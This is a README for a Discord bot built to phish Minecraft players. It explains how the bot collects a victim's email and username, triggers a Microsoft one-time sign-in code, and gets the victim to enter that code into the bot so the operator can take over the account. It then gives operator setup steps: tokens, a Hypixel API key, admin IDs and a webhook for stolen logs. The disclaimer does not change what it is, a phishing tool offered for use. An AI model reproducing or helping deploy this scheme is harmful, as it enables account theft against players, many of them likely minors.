# Minecraft-Discord-Phisher-Bot

## Disclaimer
**Usage of Minecraft-Discord-Phisher-Bot for hacking or attacking infrastructures without prior mutual consent can be considered illegal activity. It is the final user's responsibility to obey all applicable local, state, and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program.**

**Note:** Let's not term this <3.

## What Does It Do?
A Minecraft phishing Discord bot is a malicious program designed to deceive players and steal their personal information. To initiate the phishing process, the bot requests the user's email and Minecraft username, claiming this information is required for verification or to provide promised rewards or access to a server.

Once the user provides their email and username, the bot sends the email, prompting the user to log in via Microsoft's authentication system. Without the password, the operator can select "other ways to sign in" and receive a code at the provided email. Entering the verification code into the bot grants access to the user's Minecraft/Microsoft account.

## How to Run

1. **Download Python**: [Download Python](https://www.python.org/downloads/release/python-31012/)
2. **Create Your Bot**:
    - Generate your bot token and grant it all intents.
3. **Get Your API Key**:
    - Visit the [Hypixel Developer Dashboard](https://developer.hypixel.net/dashboard) and copy your API key.
4. **Configure the Bot**:
    - Place the token and API key in `config.py`.
    - Add your Discord ID in the line `self.admins = [YOUR DISCORD ID]`.
5. **Install Requirements**:
    - Open Command Prompt in the project folder and run `pip install -r requirements.txt`.
6. **Run the Bot**:
    - Execute the bot with the command `python bot.py`.
7. **Sync Commands**:
    - In your Discord server, type `!sync global`.
8. **Set Up Webhook**:
    - Use `/webhook` and enter the destination for your logs.

## What It Looks Like

### Logs Interface
![Logs Interface](https://i.imgur.com/pPeZt8H.png)

### CMD Interface
![CMD Prompt Interface](https://i.imgur.com/Hp0rAh4.png)

### Victim's Point of View<br>
(The profile picture of your bot may differ)<br>
![Victim's POV](https://i.imgur.com/s91N2fp.png)
